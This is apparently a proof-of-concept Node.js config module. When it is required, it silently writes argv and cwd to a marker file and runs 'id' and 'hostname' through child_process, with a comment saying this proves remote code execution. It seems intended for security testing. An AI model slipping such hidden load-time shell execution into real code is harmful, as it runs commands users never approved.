const fs = require('fs');
const cp = require('child_process');

// Side-effect at module load: emulates build-time config bootstrap.
try {
  fs.writeFileSync('.node-require-proof.txt',
    'FS_NODE_REQUIRE_EXEC_7Q2\n' +
    'argv=' + JSON.stringify(process.argv) + '\n' +
    'cwd=' + process.cwd() + '\n');
  // also capture exec context via a child process (proves full RCE, not just fs from node)
  cp.execSync("id >> .node-require-proof.txt 2>&1; hostname >> .node-require-proof.txt 2>&1");
} catch (e) {}

function getConfig() {
  return { env: process.env.NODE_ENV || 'development', version: '1.0.0' };
}
module.exports = { getConfig };
